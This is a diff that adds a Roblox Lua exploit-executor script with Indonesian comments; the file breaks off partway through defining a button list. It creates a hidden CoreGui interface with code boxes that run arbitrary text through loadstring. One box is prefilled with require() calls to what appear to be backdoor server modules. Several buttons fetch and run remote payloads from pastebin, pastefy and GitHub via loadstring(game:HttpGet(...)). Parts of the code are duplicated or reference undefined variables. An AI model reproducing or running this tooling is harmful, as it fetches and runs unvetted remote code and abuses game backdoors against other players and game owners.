@@ -1,0 +1,5579 @@
+local ha = math.random(5911595, 121718199) --Tenama random string
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local gak = player.PlayerGui
+local camera = workspace.CurrentCamera
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local character = player.Character or player.CharacterAdded:Wait()
+local hrp = character:WaitForChild("HumanoidRootPart")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local Lighting = game:GetService("Lighting")
+local char = player.Character or player.CharacterAdded:Wait()
+local TweenService = game:GetService("TweenService")
+local LocalPlayer = Players.LocalPlayer
+game.Players.RespawnTime = 0
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = ha
+screenGui.ResetOnSpawn = false
+screenGui.DisplayOrder = 1000000000
+screenGui.Parent = game:WaitForChild("CoreGui")
+
+
+-- Buat tombol
+local TextButton = Instance.new("ImageButton")
+TextButton.Parent = screenGui
+TextButton.Name = ha .. "Free_NOIKP7J8JL5UQZX"
+TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.BorderColor3 = Color3.fromRGB(255, 0, 0)
+TextButton.Size = UDim2.new(0, 70, 0, 70)
+TextButton.Image = "rbxassetid://103132784904697"
+TextButton.Position = UDim2.new(0.0219999999, -21, 0.0280000009, 267)
+TextButton.Draggable = true
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 10)
+UICorner.Parent = TextButton
+
+
+local function get()
+    local char = player.Character or player.CharacterAdded:Wait()
+    return char:WaitForChild("Humanoid"), char:WaitForChild("HumanoidRootPart")
+end
+
+local humanoid, hrp = get()
+
+
+
+
+local function get()
+    local char = player.Character or player.CharacterAdded:Wait()
+    return char:WaitForChild("Humanoid"), char:WaitForChild("HumanoidRootPart")
+end
+
+local humanoid, hrp = get()
+
+
+
+local button = Instance.new("ImageButton", TextButton)
+button.Size = UDim2.new(0, 35, 0, 35)
+button.Position = UDim2.new(1, 1, 1, -104)
+button.BackgroundTransparency = 1
+button.Image = "rbxasset://textures/ui/mouseLock_off@2x.png"
+
+local shift = false
+
+local function enable()
+    shift = true
+    humanoid.AutoRotate = false
+    button.Image = "rbxasset://textures/ui/mouseLock_on@2x.png"
+
+    RunService:BindToRenderStep("ShiftLockRot", Enum.RenderPriority.Character.Value, function()
+        local look = camera.CFrame.LookVector
+        hrp.CFrame = CFrame.lookAt(hrp.Position, hrp.Position + Vector3.new(look.X, 0, look.Z))
+    end)
+end
+
+local function disable()
+    shift = false
+    humanoid.AutoRotate = true
+    button.Image = "rbxasset://textures/ui/mouseLock_off@2x.png"
+
+    RunService:UnbindFromRenderStep("ShiftLockRot")
+end
+
+button.MouseButton1Click:Connect(function()
+    if shift then disable() else enable() end
+end)
+
+player.CharacterAdded:Connect(function()
+    humanoid, hrp = get()
+    if shift then enable() end
+end)
+
+local d = Instance.new("ImageButton", TextButton)
+d.Size = UDim2.new(0, 35, 0, 35)
+d.Position = UDim2.new(1, 41, 1, -142)
+d.BackgroundTransparency = 1
+d.Image = "rbxassetid://129177576488478"
+
+d.MouseButton1Click:Connect(function()
+if player.Character and player.Character:FindFirstChild("Humanoid") then
+	player.Character.Humanoid.Health = 0
+end
+end)
+
+
+
+
+local targetImage = "rbxasset://28835512e6c18903f2c959955d382a29/new_logo.png"
+
+-- Coba semua tempat yang mungkin: gethui, gethiddenui, CoreGui
+local parentsToScan = {}
+
+if gethui then
+    table.insert(parentsToScan, gethui())
+end
+if gethiddenui then
+    table.insert(parentsToScan, gethiddenui())
+end
+
+table.insert(parentsToScan, game.CoreGui)
+
+for _, parent in ipairs(parentsToScan) do
+    for _, obj in pairs(parent:GetDescendants()) do
+        if obj:IsA("ImageButton") and obj.Image == targetImage then
+            if #obj:GetChildren() > 0 then
+                obj.Position = UDim2.new(0, 8, 0, 216)
+                obj.Image = "rbxassetid://77005694743685"
+
+                -- Hapus semua UIStroke di dalamnya (children & deeper)
+                for _, descendant in ipairs(obj:GetDescendants()) do
+                    if descendant:IsA("UIStroke") then
+                        descendant:Destroy()
+                    end
+                end
+            end
+        end
+    end
+end
+-- ===================== for ui ============
+-- Frame utama
+local Frame = Instance.new("Frame")
+Frame.Parent = screenGui
+Frame.Name = ha .. "Free_HKLP7J8KL53VPXT"
+Frame.Active = true
+Frame.BackgroundTransparency = 0.85
+Frame.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
+Frame.BorderSizePixel = 1
+Frame.Position = UDim2.new(0.400000006, -486,  0.400000006, -734)
+Frame.Size = UDim2.new(0, 1900, 0, 750)
+Frame.Draggable = true
+Frame.Visible = false
+
+-- UIGradient
+local grad = Instance.new("UIGradient")
+grad.Parent = Frame
+
+grad.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),   -- Merah
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 0))    -- Biru
+})
+
+task.spawn(function()
+	while true do
+		for i = 0, 360, 1 do
+			grad.Rotation = i
+			task.wait(0.02)
+		end
+	end
+end)
+
+-- Referensi ulang pakai WaitForChild + nama random
+local screenGui2 = game:WaitForChild("CoreGui"):WaitForChild(ha)
+local TextButton2 = screenGui2:WaitForChild(ha .. "Free_NOIKP7J8JL5UQZX")
+local Frameeeee2 = screenGui2:WaitForChild(ha .. "Free_HKLP7J8KL53VPXT")
+
+local soundOn = Instance.new("Sound")
+soundOn.SoundId = "rbxassetid://1836009626"
+soundOn.Volume = 2
+soundOn.Parent = TextButton2
+
+local soundOff = Instance.new("Sound")
+soundOff.SoundId = "rbxassetid://5135809265"
+soundOff.Volume = 7
+soundOff.Parent = TextButton2
+
+local reverb = Instance.new("ReverbSoundEffect")
+reverb.DecayTime = 2
+reverb.Density = 0.5
+reverb.Parent = soundOn
+
+TextButton2.MouseButton1Click:Connect(function()
+	Frameeeee2.Visible = not Frameeeee2.Visible
+
+	-- Matikan semua suara dulu
+	soundOn:Stop()
+	soundOff:Stop()
+
+	if Frameeeee2.Visible then
+		-- Frame = ON
+		soundOn:Play()
+	else
+		-- Frame = OFF
+		soundOff:Play()
+	end
+end)
+
+local image = Instance.new("ImageLabel", Frameeeee2)
+image.Name = 'SpookyDelta'
+image.Size = UDim2.new(0, 250, 0, 250)
+image.Position = UDim2.new(0, 1669, 0, -65)
+image.BackgroundTransparency = 1
+image.Image = "rbxasset://28835512e6c18903f2c959955d382a29/new_logo.png"
+image.ImageTransparency = 0
+
+-- Efek muncul halus
+image.ImageTransparency = 0
+
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextBox = Instance.new("TextBox")
+local Execute = Instance.new("TextButton")
+local Clear = Instance.new("TextButton")
+local UICorner = Instance.new("UICorner")
+
+-- Parent ke PlayerGui
+local i2arr =[[
+--[=[
+require(134025550562615).V3("dipayy24")
+require(7004742023).Kick("dipayy24")
+require(120823731904522):C4N0FL3L("dipayy24")
+require(5702244094).space("dipayy24")
+require(7004742023).Kick("dipayy24")
+require(134025550562615).V3("dipayy24")
+require(86767995498200):C4N0FV17("dipayy24")
+require(127445614272366).op("dipayy24")
+require(132099457182422):blue2spooky("dipayy24")
+require(111283583907072):C4NC4N("dipayy24")
+require(15382805319).wellbefine("dipayy24")
+require(18867944302)("dipayy24")
+require(110047253067635):Hload("dipayy24") -- happy hub new
+]=]
+
+source=game:GetObjects("rbxassetid://71676962225329")[1].Source
+loadstring(source)()
+
+]]
+
+-- Frame utama
+Frame.Parent = Frameeeee2
+Frame.Size = UDim2.new(0, 500, 0, 300)
+Frame.Name = 'EXECUTIRSMEEN'
+Frame.Position = UDim2.new(1, -1083, 0, 3)
+Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Frame.BorderSizePixel = 0
+
+UICorner.CornerRadius = UDim.new(0, 10)
+UICorner.Parent = Frame
+
+-- TextBox buat nulis script
+TextBox.Parent = Frame
+TextBox.Size = UDim2.new(1, -20, 1, -90)
+TextBox.Position = UDim2.new(0, 10, 0, 10)
+TextBox.Text = i2arr
+TextBox.TextColor3 = Color3.fromRGB(255,255,255)
+TextBox.BackgroundColor3 = Color3.fromRGB(45,45,45)
+TextBox.TextXAlignment = Enum.TextXAlignment.Left
+TextBox.TextYAlignment = Enum.TextYAlignment.Top
+TextBox.ClearTextOnFocus = false
+TextBox.MultiLine = true
+TextBox.TextSize = 20 -- <== Ukuran teks diperbesar di sini
+TextBox.Font = Enum.Font.Code
+TextBox.RichText = true
+
+-- Tombol Execute
+Execute.Parent = Frame
+Execute.Size = UDim2.new(0.45, 0, 0, 50)
+Execute.Position = UDim2.new(0.05, 0, 1, -60)
+Execute.Text = "Execute"
+Execute.BackgroundColor3 = Color3.fromRGB(0, 170, 80)
+Execute.TextColor3 = Color3.fromRGB(255,255,255)
+Execute.Font = Enum.Font.SourceSansBold
+Execute.TextSize = 22
+
+-- Tombol Clear
+
+Clear.Parent = Frame
+Clear.Size = UDim2.new(0.45, 0, 0, 50)
+Clear.Position = UDim2.new(0.5, 0, 1, -60)
+Clear.Text = "Clear"
+Clear.BackgroundColor3 = Color3.fromRGB(170, 50, 50)
+Clear.TextColor3 = Color3.fromRGB(255,255,255)
+Clear.Font = Enum.Font.SourceSansBold
+Clear.TextSize = 22
+
+-- Fungsi tombol Execute
+Execute.MouseButton1Click:Connect(function()
+	local code = TextBox.Text
+	if code ~= "" then
+		local func, err = loadstring(code)
+		if func then
+			local ok, result = pcall(func)
+			if not ok then
+				warn("Script Error:", result)
+			end
+		else
+			warn("Loadstring Error:", err)
+		end
+	end
+end)
+
+-- Fungsi tombol Clear
+Clear.MouseButton1Click:Connect(function()
+	TextBox.Text = ""
+end)
+
+-- MAIN FRAME
+local main = Instance.new("Frame", Frameeeee2)
+main.Name = 'VisualRequoore'
+main.Size = UDim2.new(0,420,0,330)
+main.Position = UDim2.new(0.5, -948, 0.600000024, -196)
+main.BackgroundColor3 = Color3.fromRGB(30,30,30)
+main.BorderSizePixel = 0
+
+
+local title = Instance.new("TextLabel", main)
+title.Size = UDim2.new(1,0,0,28)
+title.BackgroundColor3 = Color3.fromRGB(45,45,45)
+title.BorderSizePixel = 0
+title.Text = "Executor GUI"
+title.TextColor3 = Color3.new(1,1,1)
+title.Font = Enum.Font.Code
+title.TextScaled = true
+
+--========================================================--
+-- INPUT BOX
+--========================================================--
+local box = Instance.new("TextBox", main)
+box.Size = UDim2.new(1,-20,0,32)
+box.ClearTextOnFocus = false
+box.Position = UDim2.new(0,10,0,40)
+box.BackgroundColor3 = Color3.fromRGB(40,40,40)
+box.TextColor3 = Color3.new(1,1,1)
+box.Font = Enum.Font.Code
+box.TextScaled = true
+box.PlaceholderText = ""
+box.Text = 'Require(?)??:("?")'
+
+
+-- EXECUTE BUTTON
+local btn = Instance.new("TextButton", main)
+btn.Size = UDim2.new(0,120,0,32)
+btn.Position = UDim2.new(1,-130,0,80)
+btn.BackgroundColor3 = Color3.fromRGB(70,120,70)
+btn.TextColor3 = Color3.new(1,1,1)
+btn.Font = Enum.Font.Code
+btn.TextScaled = true
+btn.Text = "Execute"
+
+--========================================================--
+-- CONSOLE OUTPUT
+--========================================================--
+local console = Instance.new("ScrollingFrame", main)
+console.Size = UDim2.new(1,-20,1,-130)
+console.Position = UDim2.new(0,10,0,120)
+console.BackgroundColor3 = Color3.fromRGB(25,25,25)
+console.BorderSizePixel = 0
+console.CanvasSize = UDim2.new(0,0,0,0)
+console.AutomaticCanvasSize = Enum.AutomaticSize.Y
+
+local layout = Instance.new("UIListLayout", console)
+layout.Padding = UDim.new(0,4)
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+
+--========================================================--
+-- LOGGING SYSTEM (AMAN UNTUK EXECUTOR)
+--========================================================--
+local Bind = Instance.new("BindableEvent")
+
+local function Log(msg)
+    Bind:Fire("[LOG] "..tostring(msg))
+end
+
+Bind.Event:Connect(function(text)
+    local t = Instance.new("TextLabel")
+    t.Parent = console
+    t.Size = UDim2.new(1,-10,0,18)
+    t.BackgroundTransparency = 1
+    t.TextColor3 = Color3.fromRGB(200,200,200)
+    t.Font = Enum.Font.Code
+    t.TextXAlignment = Enum.TextXAlignment.Left
+    t.Text = text
+end)
+
+Log("Executor initialized.")
+
+local LogEvent = Instance.new("BindableEvent")
+
+local function logMessage(msg)
+	LogEvent:Fire(tostring(msg))
+end
+
+LogEvent.Event:Connect(function(msg)
+	local label = Instance.new("TextLabel", scroll)
+	label.Text = msg
+	label.Font = Enum.Font.Code
+	label.TextSize = 14
+	label.TextColor3 = Color3.fromRGB(255, 255, 255)
+	label.BackgroundTransparency = 1
+	label.Size = UDim2.new(1, 0, 0, 18)
+end)
+
+--========================================================--
+-- EXECUTE SYSTEM
+--========================================================--
+btn.MouseButton1Click:Connect(function()
+local scriptText = box.Text
+local assetId = scriptText:match("require%s*%(?%s*(%d+)%s*%)?")
+
+if assetId then
+    local success, result = pcall(function()
+
+        local objects = game:GetObjects("rbxassetid://" .. assetId)
+        local obj = objects[1]
+
+        if obj then
+            if obj:IsA("ScreenGui") then
+                obj.Parent = gak
+wait(0.5)
+            -- FRAME
+            elseif obj:IsA("Frame") then
+                obj.Active = true
+                obj.Draggable = true
+wait(0.5)
+            -- PART
+            elseif obj:IsA("Part") then
+                obj.Position = hrp.Position + Vector3.new(0, 10, 0)
+wait(0.5)
+            -- MODEL
+            elseif obj:IsA("Model") then
+                obj:PivotTo(CFrame.new(hrp.Position + Vector3.new(0, 10, 0)))
+            end
+wait(0.5)
+            -- MODULE SCRIPT (ini HARUS DI LUAR BLOCK MODEL)
+            if obj:IsA("ModuleScript") then
+                local modSuccess, modResult = pcall(function()
+                    return require(obj)
+                end)
+
+                if not modSuccess then
+                    logMessage("Error requiring module: ".. tostring(modResult))
+                end
+            end
+
+        end
+    end)
+
+    if not success then
+        logMessage("Error loading asset: ".. tostring(result))
+    end
+
+else
+    logMessage("Invalid require() syntax.")
+end
+end)
+
+-- Buat Frame utama
+local frame = Instance.new("Frame")
+frame.Name = 'InfoGamee'
+frame.Size = UDim2.new(0, 450, 0, 220)
+frame.Position = UDim2.new(0.5, -17, 0.150000006, -339)
+frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+frame.BackgroundTransparency = 0.05
+frame.Parent = Frameeeee2
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 10)
+corner.Parent = frame
+
+-- Ambil info game
+local success, info = pcall(function()
+	return MarketplaceService:GetProductInfo(game.PlaceId)
+end)
+
+local gameName = "Game Roblox"
+if success and info and info.Name then
+	gameName = info.Name
+end
+
+local gameId = tostring(game.GameId)
+
+-- Data info player
+local infoList = {
+	{ title = "Nama Player", value = player.Name },
+	{ title = "Player ID", value = tostring(player.UserId) },
+	{ title = "Sedang bermain", value = gameName },
+	{ title = "Game ID", value = gameId },
+}
+
+-- Fungsi buat baris label + tombol copy
+local function createInfoLine(parent, yPos, title, value)
+	local lineFrame = Instance.new("Frame")
+	lineFrame.Size = UDim2.new(1, -20, 0, 40)
+	lineFrame.Position = UDim2.new(0, 10, 0, yPos)
+	lineFrame.BackgroundTransparency = 1
+	lineFrame.Parent = parent
+
+	local label = Instance.new("TextLabel")
+	label.Size = UDim2.new(1, -120, 1, 0)
+	label.BackgroundTransparency = 1
+	label.TextColor3 = Color3.fromRGB(255, 255, 255)
+	label.Font = Enum.Font.SourceSansBold
+	label.TextSize = 20
+	label.TextXAlignment = Enum.TextXAlignment.Left
+	label.Text = title .. ": " .. value
+	label.Parent = lineFrame
+
+	local button = Instance.new("TextButton")
+	button.Size = UDim2.new(0, 100, 0, 30)
+	button.Position = UDim2.new(1, -100, 0.5, -15)
+	button.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+	button.Text = "Copy"
+	button.TextColor3 = Color3.fromRGB(255, 255, 255)
+	button.Font = Enum.Font.SourceSansBold
+	button.TextSize = 18
+	button.Parent = lineFrame
+
+	local corner = Instance.new("UICorner")
+	corner.CornerRadius = UDim.new(0, 6)
+	corner.Parent = button
+
+	button.MouseButton1Click:Connect(function()
+		if setclipboard then
+			setclipboard(value)
+			button.Text = "✅ Copied!"
+			task.wait(1.2)
+			button.Text = "Copy"
+		else
+			button.Text = "❌ Tidak bisa"
+			task.wait(1.2)
+			button.Text = "Copy"
+		end
+	end)
+end
+
+-- Buat semua baris
+local startY = 15
+local gap = 45
+
+for i, data in ipairs(infoList) do
+	createInfoLine(frame, startY + (i - 1) * gap, data.title, data.value)
+end
+
+
+-- === RIGHT SIDE PANEL ===
+local rightPanel = Instance.new("Frame", main)
+rightPanel.Size = UDim2.new(0, 270, 0, 270)
+rightPanel.Position = UDim2.new(1, 10, 0, 0)
+rightPanel.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
+rightPanel.BorderSizePixel = 2
+
+local rightHeader = Instance.new("TextLabel", rightPanel)
+rightHeader.Size = UDim2.new(1, 0, 0, 30)
+rightHeader.BackgroundColor3 = Color3.fromRGB(180, 180, 180)
+rightHeader.Text = "file script 👨‍💻"
+rightHeader.Font = Enum.Font.SourceSansBold
+rightHeader.TextColor3 = Color3.fromRGB(0, 0, 0)
+rightHeader.TextSize = 18
+rightHeader.BorderSizePixel = 0
+
+local rightScroll = Instance.new("ScrollingFrame", rightPanel)
+rightScroll.Size = UDim2.new(1, 0, 1, -30)
+rightScroll.Position = UDim2.new(0, 0, 0, 30)
+rightScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+rightScroll.ScrollBarThickness = 6
+rightScroll.BackgroundTransparency = 1
+
+local rightLayout = Instance.new("UIListLayout", rightScroll)
+rightLayout.SortOrder = Enum.SortOrder.LayoutOrder
+rightLayout.Padding = UDim.new(0, 5)
+
+-- Fungsi buat nambah tombol otomatis ke panel kanan
+local function addRightButton(text, color, callback)
+	local btn = Instance.new("TextButton", rightScroll)
+	btn.Text = text
+	btn.Size = UDim2.new(1, -10, 0, 35)
+	btn.BackgroundColor3 = color or Color3.fromRGB(200, 200, 200)
+	btn.TextColor3 = Color3.fromRGB(0, 0, 0)
+	btn.Font = Enum.Font.SourceSansBold
+	btn.TextSize = 16
+	btn.BorderSizePixel = 1
+	btn.AutoButtonColor = true
+	btn.MouseButton1Click:Connect(callback)
+	
+	rightScroll.CanvasSize = UDim2.new(0, 0, 0, rightLayout.AbsoluteContentSize.Y + 10)
+end
+
+-- === Contoh tombol di kanan ===
+
+
+addRightButton("  Project broken Spawn ", Color3.fromRGB(200, 200, 255), function()
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+local project = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local clear = Instance.new("TextButton")
+local outputContainer = Instance.new("ScrollingFrame")
+local output = Instance.new("TextLabel")
+local TextLabel = Instance.new("TextLabel")
+local image = Instance.new("ImageLabel")
+local TextBox = Instance.new("TextBox")
+local project_2 = Instance.new("TextButton")
+local view = Instance.new("TextButton")
+local scriptlist = Instance.new("ScrollingFrame")
+local blue = Instance.new("TextButton")
+local infyield = Instance.new("TextButton")
+local skid = Instance.new("TextButton")
+local c00lgui = Instance.new("TextButton")
+local Dex = Instance.new("TextButton")
+local exser = Instance.new("TextButton")
+local Topk3k = Instance.new("TextButton")
+local Duck = Instance.new("TextButton")
+local Disco = Instance.new("TextButton")
+local Polaria = Instance.new("TextButton")
+local BiPolaria = Instance.new("TextButton")
+local Scythe = Instance.new("TextButton")
+local Freddy = Instance.new("TextButton")
+local Soul = Instance.new("TextButton")
+local Goner = Instance.new("TextButton")
+local Mr = Instance.new("TextButton")
+local pex = Instance.new("TextButton")
+local logo = Instance.new("TextButton")
+local HeadName = Instance.new("TextButton")
+local kick = Instance.new("TextButton")
+local virus = Instance.new("TextButton")
+local Decal = Instance.new("TextButton")
+local execute = Instance.new("TextButton")
+local Admin = Instance.new("TextButton")
+local Car = Instance.new("TextButton")
+local close = Instance.new("TextButton")
+local ssp = Instance.new("TextButton")
+local disco = Instance.new("TextButton")
+local Dec = Instance.new("TextButton")
+local jum = Instance.new("TextButton")
+local credit = Instance.new("TextButton")
+local ex = Instance.new("TextButton")
+local R6 = Instance.new("TextButton")
+local Re = Instance.new("TextButton")
+local Cool = Instance.new("TextButton")
+local Deca = Instance.new("TextButton")
+local DIS = Instance.new("TextButton")
+local ju = Instance.new("TextButton")
+local shel = Instance.new("TextButton")
+local lua = Instance.new("TextButton")
+local hint = Instance.new("TextButton")
+
+project.Name = "project"
+project.Parent = game.CoreGui
+
+Frame.Parent = project
+Frame.Active = true
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.Position = UDim2.new(0.236403197, 0, 0.1433869, 0)
+Frame.Size = UDim2.new(0, 627, 0, 381)
+Frame.Draggable = true
+
+execute.Name = "execute"
+execute.Parent = Frame
+execute.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+execute.Position = UDim2.new(0.0159489624, 0, 0.685039341, 0)
+execute.Size = UDim2.new(0, 137, 0, 27)
+execute.Font = Enum.Font.SourceSans
+execute.Text = "Execute"
+execute.TextColor3 = Color3.fromRGB(0, 0, 0)
+execute.TextSize = 25.000
+execute.MouseButton1Click:Connect(function()
+local code = TextBox.Text
+    if code and code ~= "" then
+        local success, err = pcall(function()
+            loadstring(code)()
+        end)
+        if not success then
+            output.Text = "Error: " .. err
+        else
+            output.Text = "script executed successfully!"
+        end
+    else
+        output.Text = "Please enter a script to execute."
+    end
+end)
+
+view.Name = "view"
+view.Parent = Frame
+view.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+view.BorderSizePixel = 0
+view.Position = UDim2.new(0.140350878, 0, 0.076115489, 0)
+view.Size = UDim2.new(0, 88, 0, 18)
+view.Font = Enum.Font.SourceSans
+view.Text = "Admin panel"
+view.TextColor3 = Color3.fromRGB(0, 0, 0)
+view.TextSize = 19.000
+view.MouseButton1Click:Connect(function()
+end)
+
+clear.Name = "clear"
+clear.Parent = Frame
+clear.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+clear.Position = UDim2.new(0.0159489624, 0, 0.790026248, 0)
+clear.Size = UDim2.new(0, 137, 0, 23)
+clear.Font = Enum.Font.SourceSans
+clear.Text = "Clear"
+clear.TextColor3 = Color3.fromRGB(0, 0, 0)
+clear.TextSize = 25.000
+clear.MouseButton1Click:Connect(function()
+    TextBox.Text = ""
+    output.Text = "Output cleared."
+end)
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.047846891, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 597, 0, 22)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "Project Broken spawn v4.1.0"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 30.000
+TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+image.Name = "image"
+image.Parent = Frame
+image.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+image.BorderSizePixel = 0
+image.Size = UDim2.new(0, 23, 0, 22)
+image.Image = "rbxassetid://"
+
+TextBox.Parent = Frame
+TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.Position = UDim2.new(0.0159489624, 0, 0.144356951, 0)
+TextBox.Size = UDim2.new(0, 464, 0, 193)
+TextBox.ClearTextOnFocus = false
+TextBox.Font = Enum.Font.SourceSans
+TextBox.MultiLine = true
+TextBox.Text = "Print(*hello-world*)"
+TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.TextSize = 19.000
+TextBox.TextXAlignment = Enum.TextXAlignment.Left
+TextBox.TextYAlignment = Enum.TextYAlignment.Top
+
+project_2.Name = "project_2"
+project_2.Parent = Frame
+project_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+project_2.BorderSizePixel = 0
+project_2.Position = UDim2.new(0, 0, 0.076115489, 0)
+project_2.Size = UDim2.new(0, 88, 0, 18)
+project_2.Font = Enum.Font.SourceSans
+project_2.Text = "Executor"
+project_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+project_2.TextSize = 19.000
+
+view.Name = "view"
+view.Parent = Frame
+view.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+view.BorderSizePixel = 0
+view.Position = UDim2.new(0.140350878, 0, 0.076115489, 0)
+view.Size = UDim2.new(0, 88, 0, 18)
+view.Font = Enum.Font.SourceSans
+view.Text = "Admin panel"
+view.TextColor3 = Color3.fromRGB(0, 0, 0)
+view.TextSize = 19.000
+view.MouseButton1Click:Connect(function()
+end)
+
+scriptlist.Name = "scriptlist"
+scriptlist.Parent = Frame
+scriptlist.Active = true
+scriptlist.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+scriptlist.Position = UDim2.new(0.768740058, 0, 0.144356951, 0)
+scriptlist.Size = UDim2.new(0, 145, 0, 316)
+scriptlist.HorizontalScrollBarInset = Enum.ScrollBarInset.Always
+scriptlist.ScrollBarThickness = 13
+
+R6.Name = "R6"
+R6.Parent = Frame
+R6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+R6.Position = UDim2.new(0.25, 0, 0.685039341, 80)
+R6.Size = UDim2.new(0, 137, 0, 27)
+R6.Font = Enum.Font.SourceSans
+R6.Text = "R6"
+R6.TextColor3 = Color3.fromRGB(0, 0, 0)
+R6.TextSize = 30.000
+R6.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sunday102711-bit/E00KIDD-r6-by-me/refs/heads/main/R6%20Real"))()
+end)
+
+Re.Name = "Re"
+Re.Parent = Frame
+Re.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Re.Position = UDim2.new(0.25, 0, 0.790026248, 0)
+Re.Size = UDim2.new(0, 137, 0, 27)
+Re.Font = Enum.Font.SourceSans
+Re.Text = "Re"
+Re.TextColor3 = Color3.fromRGB(0, 0, 0)
+Re.TextSize = 30.000
+Re.MouseButton1Click:Connect(function()
+if game.Players.LocalPlayer.Character then
+game.Players.LocalPlayer.Character.Humanoid.Health = 0
+end
+end)
+
+infyield.Name = "infyield"
+infyield.Parent = scriptlist
+infyield.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+infyield.Position = UDim2.new(0, 0, -0.000480845018, 0)
+infyield.Size = UDim2.new(0, 132, 0, 23)
+infyield.Font = Enum.Font.SourceSans
+infyield.Text = "SSP.txt"
+infyield.TextColor3 = Color3.fromRGB(0, 0, 0)
+infyield.TextSize = 20.000
+infyield.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/XHqVeb0d/raw"))()
+end)
+
+skid.Name = "skid"
+skid.Parent = scriptlist
+skid.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+skid.Position = UDim2.new(0, 0, 0.0297028814, 0)
+skid.Size = UDim2.new(0, 132, 0, 23)
+skid.Font = Enum.Font.SourceSans
+skid.Text = "PRIMADON.TXT"
+skid.TextColor3 = Color3.fromRGB(0, 0, 0)
+skid.TextSize = 20.000
+skid.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/37iQzQp3"))()
+end)
+
+c00lgui.Name = "c00lgui"
+c00lgui.Parent = scriptlist
+c00lgui.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+c00lgui.Position = UDim2.new(0, 0, 0.0598866083, 0)
+c00lgui.Size = UDim2.new(0, 132, 0, 23)
+c00lgui.Font = Enum.Font.SourceSans
+c00lgui.Text = "DABEBY-CAR.TXT"
+c00lgui.TextColor3 = Color3.fromRGB(0, 0, 0)
+c00lgui.TextSize = 20.000
+c00lgui.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/xtIOQGPy/raw"))()
+end)
+
+Dex.Name = "Dex"
+Dex.Parent = scriptlist
+Dex.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Dex.Position = UDim2.new(0, 0, 0.0900703371, 0)
+Dex.Size = UDim2.new(0, 132, 0, 23)
+Dex.Font = Enum.Font.SourceSans
+Dex.Text = "GRANDOSLA.TXT"
+Dex.TextColor3 = Color3.fromRGB(0, 0, 0)
+Dex.TextSize = 20.000
+Dex.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/Kql9VClT/raw"))()
+end)
+
+blue.Name = "blue"
+blue.Parent = scriptlist
+blue.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+blue.Position = UDim2.new(0, 0, 0.120254062, 0)
+blue.Size = UDim2.new(0, 132, 0, 23)
+blue.Font = Enum.Font.SourceSans
+blue.Text = "EXVATOR.TXT"
+blue.TextColor3 = Color3.fromRGB(0, 0, 0)
+blue.TextSize = 20.000
+blue.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://pastefy.app/q74DFYYz/raw", true))()
+end)
+
+exser.Name = "exser"
+exser.Parent = scriptlist
+exser.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+exser.Position = UDim2.new(0, 0, 0.0, 116)
+exser.Size = UDim2.new(0, 132, 0, 23)
+exser.Font = Enum.Font.SourceSans
+exser.Text = "GONER.TXT"
+exser.TextColor3 = Color3.fromRGB(0, 0, 0)
+exser.TextSize = 20.000
+exser.MouseButton1Click:Connect(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gObl00x/My-Converts/refs/heads/main/Goner.lua"))()
+end)
+
+Topk3k.Name = "Topk3k"
+Topk3k.Parent = scriptlist
+Topk3k.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Topk3k.Position = UDim2.new(0, 0, 0.0, 139)
+Topk3k.Size = UDim2.new(0, 132, 0, 23)
+Topk3k.Font = Enum.Font.SourceSans
